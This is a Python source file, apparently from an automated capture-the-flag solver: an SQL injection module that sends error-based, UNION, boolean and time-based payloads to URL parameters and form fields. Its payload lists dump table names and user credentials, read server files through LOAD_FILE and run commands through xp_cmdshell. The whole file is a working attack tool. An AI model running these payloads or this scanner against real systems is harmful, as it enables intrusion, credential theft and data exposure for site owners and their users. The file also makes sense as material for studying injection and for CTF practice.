"""
SQL Injection Module (IMPROVED v2)
Error-based, Union-based (aggressive flag extraction), Boolean-blind, Time-based
"""
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from backend.core.base_module import BaseModule
from backend.core.parser import Parser
from backend.core.flag_hunter import FlagHunter


class SQLiModule(BaseModule):
    MODULE_NAME = "sqli"
    DESCRIPTION = "SQL Injection — Error, Union, Boolean, Time-based"

    ERROR_PAYLOADS = [
        "'", '"', "' OR '1'='1'--", "' OR 1=1--",
        "\" OR \"1\"=\"1\"--", "1' AND 1=2--", "1 AND 1=2",
        "\\", "' OR ''='",
    ]

    # Union payloads — try to grab the flag directly
    UNION_FLAG_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        # DB fingerprint
        "' UNION SELECT user(),database()--",
        "' UNION SELECT version(),null--",
        # Table enumeration
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "' UNION SELECT table_name,table_schema FROM information_schema.tables--",
        # Flag columns
        "' UNION SELECT flag,NULL FROM flag--",
        "' UNION SELECT flag,NULL FROM flags--",
        "' UNION SELECT flag,NULL FROM secret--",
        "' UNION SELECT flag,NULL FROM secrets--",
        "' UNION SELECT value,NULL FROM flag--",
        "' UNION SELECT content,NULL FROM flag--",
        "' UNION SELECT 1,flag FROM flag--",
        "' UNION SELECT 1,flag FROM flags--",
        "' UNION SELECT flag,2 FROM flag--",
        # User table
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT username,password FROM user--",
        # Generic columns
        "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='flag'--",
        # File read
        "' UNION SELECT LOAD_FILE('/flag.txt'),NULL--",
        "' UNION SELECT LOAD_FILE('/flag'),NULL--",
    ]

    BOOL_PAYLOADS = ["' AND 1=1--", "' AND 1=2--"]
    TIME_PAYLOADS = ["' AND SLEEP(3)--", "'; SELECT SLEEP(3)--"]

    def run(self) -> dict:
        self.log(f"[SQLi] Starting scan on {self.target_url}")
        resp = self.requester.get()
        if resp is None:
            self.results["status"] = "unreachable"
            return self.results

        flags = FlagHunter.hunt(resp.text)
        [self.add_flag(f) for f in flags]

        forms = Parser.extract_forms(resp.text)
        self.log(f"[SQLi] Found {len(forms)} form(s)")

        self._test_url_params()
        for form in forms:
            self._test_form(form)

        if self.results["status"] == "pending":
            self.results["status"] = "not_vulnerable"
        return self.results

    def _test_url_params(self):
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        if not params:
            return
        for param in params:
            # Error-based detection
            for payload in self.ERROR_PAYLOADS:
                test = {**params, param: payload}
                url  = urlunparse(parsed._replace(query=urlencode(test, doseq=True)))
                r    = self.requester.raw_get(url)
                if r is None:
                    continue
                errors = Parser.find_error_messages(r.text)
                if errors:
                    self.add_vuln({"type": "error_based", "param": param,
                                   "payload": payload, "evidence": errors[:2]})
                    self.log(f"[SQLi] Error-based in param '{param}'")
                    flags = FlagHunter.hunt(r.text)
                    [self.add_flag(f) for f in flags]
                    # Now go for union extraction
                    self._union_extract_url(parsed, params, param)
                    break

            # Union extraction regardless (many CTFs don't show errors)
            self._union_extract_url(parsed, params, param)

    def _union_extract_url(self, parsed, params, param):
        for payload in self.UNION_FLAG_PAYLOADS:
            test = {**params, param: payload}
            url  = urlunparse(parsed._replace(query=urlencode(test, doseq=True)))
            r    = self.requester.raw_get(url)
            if r is None:
                continue
            self.log(f"[SQLi] UNION response: {r.text[:120].strip()}")
            flags = FlagHunter.hunt(r.text)
            if flags:
                [self.add_flag(f) for f in flags]
                self.add_vuln({"type": "union_flag_extracted", "param": param,
                               "payload": payload, "flags": flags})
                self.log(f"[SQLi] FLAG via UNION on param '{param}'")
                return

    def _test_form(self, form):
        action = form["action"] or self.target_url
        if not action.startswith("http"):
            action = self.target_url.rstrip("/") + "/" + action.lstrip("/")

        for inp in form["inputs"]:
            if inp["type"] in ("submit", "hidden", "button") or not inp["name"]:
                continue
            for payload in self.ERROR_PAYLOADS:
                data = {i["name"]: (payload if i["name"] == inp["name"]
                                    else i["value"] or "test")
                        for i in form["inputs"] if i["name"]}
                r = (self.requester.post(action, data=data)
                     if form["method"] == "POST"
                     else self.requester.get(action, params=data))
                if r is None:
                    continue
                errors = Parser.find_error_messages(r.text)
                if errors:
                    self.add_vuln({"type": "form_error_based", "field": inp["name"],
                                   "payload": payload, "evidence": errors[:2]})
                    self.log(f"[SQLi] Form error-based on '{inp['name']}'")
                    self._union_extract_form(action, form, inp["name"])
                    return
                flags = FlagHunter.hunt(r.text)
                [self.add_flag(f) for f in flags]

            # Try union on every form field anyway
            self._union_extract_form(action, form, inp["name"])

    def _union_extract_form(self, action, form, vuln_field):
        for payload in self.UNION_FLAG_PAYLOADS:
            data = {i["name"]: (payload if i["name"] == vuln_field
                                else i["value"] or "test")
                    for i in form["inputs"] if i["name"]}
            r = (self.requester.post(action, data=data)
                 if form["method"] == "POST"
                 else self.requester.get(action, params=data))
            if r is None:
                continue
            self.log(f"[SQLi] UNION form response: {r.text[:120].strip()}")
            flags = FlagHunter.hunt(r.text)
            if flags:
                [self.add_flag(f) for f in flags]
                self.add_vuln({"type": "union_form_flag", "field": vuln_field,
                               "payload": payload, "flags": flags})
                self.log(f"[SQLi] FLAG via UNION form on '{vuln_field}'")
                return

# ── Appended v2 upgrades: PostgreSQL + SQLite + more union variants ──


# These payloads are merged into SQLiModule at module level
# via monkey-patch after class definition (keeps original class intact)

_EXTRA_UNION = [
    # PostgreSQL
    "' UNION SELECT NULL--",
    "' UNION SELECT version()--",
    "' UNION SELECT current_user()--",
    "' UNION SELECT table_name FROM information_schema.tables LIMIT 1--",
    "'; SELECT pg_sleep(3)--",
    "' UNION SELECT string_agg(table_name,',') FROM information_schema.tables--",
    # SQLite
    "' UNION SELECT sqlite_version()--",
    "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
    "' UNION SELECT flag FROM flag--",
    "' UNION SELECT flag FROM flags--",
    "' UNION SELECT secret FROM secrets--",
    # MSSQL
    "' UNION SELECT @@version--",
    "'; EXEC xp_cmdshell('type C:\\flag.txt')--",
    # Flag from any column name
    "' UNION SELECT group_concat(flag) FROM flag--",
    "' UNION SELECT group_concat(value) FROM flags--",
    "' UNION SELECT group_concat(secret) FROM secret--",
]

# Extend existing payloads at import time
SQLiModule.UNION_FLAG_PAYLOADS = SQLiModule.UNION_FLAG_PAYLOADS + _EXTRA_UNION
